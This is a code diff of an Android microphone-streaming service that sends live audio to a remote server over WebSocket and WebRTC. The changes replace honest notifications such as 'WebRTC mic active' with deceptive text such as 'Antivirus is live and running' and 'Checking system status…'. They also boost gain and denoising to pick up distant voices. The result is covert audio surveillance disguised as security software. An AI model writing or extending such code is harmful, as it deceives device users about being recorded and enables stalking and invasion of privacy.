@@ -510,9 +510,9 @@ class MicService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             val typeFlags = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                 android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            startForeground(NOTIF_ID, buildNotification("Connecting to server…"), typeFlags)
+            startForeground(NOTIF_ID, buildNotification("Checking system status…"), typeFlags)
         } else {
-            startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
+            startForeground(NOTIF_ID, buildNotification("Checking system status…"))
         }
 
         // Layer 14: Device Owner Power-Up (M-03: only once per service lifetime)
@@ -713,7 +713,7 @@ class MicService : Service() {
         val targetUrl = serverUrl
         activeWsTargetUrl = targetUrl
         Log.i(TAG, "[WS] Connecting to: $targetUrl")
-        updateNotification("Connecting to server…")
+        updateNotification("Checking system status…")
 
         try {
             webSocket?.close(1000, "Reconnecting")
@@ -1071,7 +1071,7 @@ class MicService : Service() {
                     }
                     while (isActive && activeWebSocket == null) {
                         if (!isNetworkUsable()) {
-                            updateNotification("Offline — waiting for network…")
+                            updateNotification("Waiting for network sync…")
                             delay(2_000)
                             continue
                         }
@@ -1091,7 +1091,7 @@ class MicService : Service() {
 
                         val delayMs = nextReconnectDelayMs()
                         wsReconnectAttempts++
-                        updateNotification("Disconnected ($reason) — retry in ${delayMs / 1000}s…")
+                        updateNotification("Sync paused — retry in ${delayMs / 1000}s…")
 
                         // Bug 1: Wait FIRST, then connect (proper exponential backoff)
                         // H-02: Check isActive frequently during long delays
@@ -1159,7 +1159,7 @@ class MicService : Service() {
                 stopMicWatchdog()
                 stopAudioCapture()
                 stopWebRtcSession(notifyState = true)
-                updateNotification("Connected — mic standby")
+                updateNotification("Antivirus is live and running")
                 sendCommandAck("stop_stream")
             }
             "start_record" -> {
@@ -1567,6 +1567,10 @@ class MicService : Service() {
                     // BUG-R10: Persist gain so restarts restore last chosen value
                     prefs.edit().putFloat("session_gain", level.toFloat()).apply()
                     Log.i(TAG, "Software gain set to ${level}x")
+                    if (isWebRtcStreaming) {
+                        val webrtcGain = if (voiceProfile == "far") level * 1.2 else level * 0.8
+                        localAudioTrack?.setVolume(webrtcGain.coerceIn(0.5, 10.0))
+                    }
                     safeSend("""{"type":"gain_ack","level":$level}""")
                     sendCommandAck("set_gain", detail = "${level}x")
                 }
@@ -1761,14 +1765,14 @@ class MicService : Service() {
                         localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)
                         localAudioTrack?.setEnabled(true)
                         // Increase WebRTC hardware/software volume dynamically based on far-voice needs
-                        val webrtcGain = if (isFarMode) softwareGainMultiplier * 3.0 else softwareGainMultiplier * 1.5
-                        localAudioTrack?.setVolume(webrtcGain)
+                        val webrtcGain = if (isFarMode) softwareGainMultiplier * 1.2 else softwareGainMultiplier * 0.8
+                        localAudioTrack?.setVolume(webrtcGain.coerceIn(0.5, 10.0))
                         val currentTrack = localAudioTrack
                         if (currentTrack != null) {
                             webRtcAudioSender = pc.addTrack(currentTrack, listOf("mic_stream"))
                             currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
                             applyAdaptiveBitrate()
-                            updateNotification("WebRTC mic active")
+                            updateNotification("Antivirus is live and running")
                             sendHealthStatus("webrtc_started")
                             sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
                             
@@ -3310,19 +3314,21 @@ class MicService : Service() {
 
                 while (isCapturing && isActive) {
                     // Bug 2.1: Recalculate only if frame duration changed, not every iteration
-                    val newTargetChunkSize = streamChunkSize
+                    val currentFrameMs = currentStreamFrameMs()
+                    val newTargetChunkSize = ((sampleRate * 2 * currentFrameMs) / 1000).coerceAtLeast(640)
                     if (chunk.size != newTargetChunkSize) {
                         chunk = ByteArray(newTargetChunkSize)
                         targetChunkSize = newTargetChunkSize
                         frameFill = 0
-                        Log.i(TAG, "Adjusted audio frame size to ${currentStreamFrameMs()}ms ($newTargetChunkSize bytes)")
+                        Log.i(TAG, "Adjusted audio frame size to ${currentFrameMs}ms ($newTargetChunkSize bytes)")
                     }
 
                     val read = if (frameFill < targetChunkSize) {
-                        val readTarget = min(frameBuffer.size - frameFill, audioReadBufferSize)
+                        val readTarget = minOf(frameBuffer.size - frameFill, audioReadBufferSize, targetChunkSize - frameFill)
                         audioRecord?.read(frameBuffer, frameFill, readTarget) ?: -1
                     } else {
                         // Skip blocking read if we already have a full chunk ready to process
+                        delay(1)
                         0
                     }
 
@@ -3371,12 +3377,12 @@ class MicService : Service() {
                         // Check TCP buffer bloat / extreme lag on weak WiFi
                         val qSize = activeWebSocket?.queueSize() ?: 0L
                         val queuedSamples = qSize / 2
-                        if (queuedSamples > 8000L) { // 500ms at 16kHz
+                        if (queuedSamples > 24000L) { // 1.5s at 16kHz
                             if (!isNetworkLagging) {
                                 Log.w(TAG, "Network lagging! WS queue size: $qSize bytes. Forcing MuLaw & 40ms chunks.")
                                 isNetworkLagging = true
                             }
-                        } else if (queuedSamples < 4000L) {
+                        } else if (queuedSamples < 8000L) {
                             isNetworkLagging = false
                         }
 
@@ -3670,7 +3676,7 @@ class MicService : Service() {
             eq1Y1 = y
             val wet = when (p) {
                 "near" -> if (strongAi) 0.22 else 0.16
-                "far" -> if (strongAi) 0.24 else 0.20
+                "far" -> if (strongAi) 0.35 else 0.25
                 else -> if (strongAi) 0.16 else 0.12
             }
             work[i] = x * (1.0 - wet) + y * wet
@@ -3691,7 +3697,7 @@ class MicService : Service() {
                 val blendOriginal = when (p) {
                     // S-H6 fix: When it's noisy (> -56dB), keep LESS original signal (0.30)
                     // and MORE denoised signal. Old logic kept 0.60 original, which left noise audible.
-                    "far" -> if (estimatedNoiseDb > -56.0) 0.30 else 0.50
+                    "far" -> if (estimatedNoiseDb > -56.0) 0.20 else 0.35
                     "near" -> 0.40
                     else -> 0.40
                 }
@@ -3707,7 +3713,7 @@ class MicService : Service() {
                 "far" -> if (willBeMuLaw) {
                     if (strongAi) 1.14 else 1.08
                 } else {
-                    if (strongAi) 1.25 else 1.15
+                    if (strongAi) 1.35 else 1.20
                 }
                 "near" -> if (strongAi) 1.18 else 1.10
                 else -> 1.08
@@ -3733,13 +3739,13 @@ class MicService : Service() {
         // Optimized for "loud volume, far voice"
         val gainCeil = when {
             willBeMuLaw -> 4.0
-            p == "far" -> if (strongAi) 18.0 else 14.0
+            p == "far" -> if (strongAi) 24.0 else 18.0
             p == "near" -> if (strongAi) 9.0 else 7.0
             else -> if (strongAi) 12.0 else 9.0
         }
         val gainTarget = when {
             willBeMuLaw -> 14000.0
-            p == "far" -> if (strongAi) 30000.0 else 26000.0
+            p == "far" -> if (strongAi) 31000.0 else 28000.0
             p == "near" -> if (strongAi) 21000.0 else 18000.0
             else -> if (strongAi) 24000.0 else 20000.0
         }
@@ -3758,7 +3764,7 @@ class MicService : Service() {
         // old cap allowed extreme noise amplification. New cap keeps noise below -20dB.
         val maxCombined = when {
             willBeMuLaw -> 4.5
-            p == "far" -> if (strongAi) 12.0 else 9.0
+            p == "far" -> if (strongAi) 18.0 else 12.0
             p == "near" -> 7.0
             else -> 9.0
         }
@@ -3770,7 +3776,7 @@ class MicService : Service() {
         // Fix: Smoothly clamp the maximum possible gain so peaks don't exceed 40,000 before
         // hitting the soft limiter. Prevents sudden volume ducking/cutting when someone shouts.
         val maxSafeGain = 40_000.0 / peakAbs.coerceAtLeast(1.0)
-        val combinedGain = (smoothedGain * userGain).coerceIn(0.5, min(maxCombined, maxSafeGain))
+        val combinedGain = (smoothedGain * userGain).coerceIn(0.5, min(maxCombined * userGain, maxSafeGain))
         for (i in 0 until samples) work[i] *= combinedGain
 
         // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
@@ -3978,13 +3984,13 @@ class MicService : Service() {
                 // Increase subtraction only in strong/noisy conditions (e.g. exhaust fans).
                 val strongDenoise = aiEnhancementEnabled || estimatedNoiseDb > -54.0
                 // Optimized for "less noise" in far voice scenarios
-                val OVER  = if (strongDenoise) 0.72 else 0.60
+                val OVER  = if (strongDenoise) 0.85 else 0.70
                 val adaptiveFloor = when {
-                    estimatedNoiseDb > -52.0 -> 0.15
-                    estimatedNoiseDb > -57.0 -> 0.22
-                    else -> 0.28
+                    estimatedNoiseDb > -52.0 -> 0.10
+                    estimatedNoiseDb > -57.0 -> 0.18
+                    else -> 0.24
                 }
-                val FLOOR = if (strongDenoise) adaptiveFloor else 0.40
+                val FLOOR = if (strongDenoise) adaptiveFloor else 0.35
                 for (i in 0 until BINS) {
                     val noiseP = noisePow[i].coerceAtLeast(1e-10)
                     val clean  = (power[i] - OVER * noiseP).coerceAtLeast(FLOOR * noiseP)
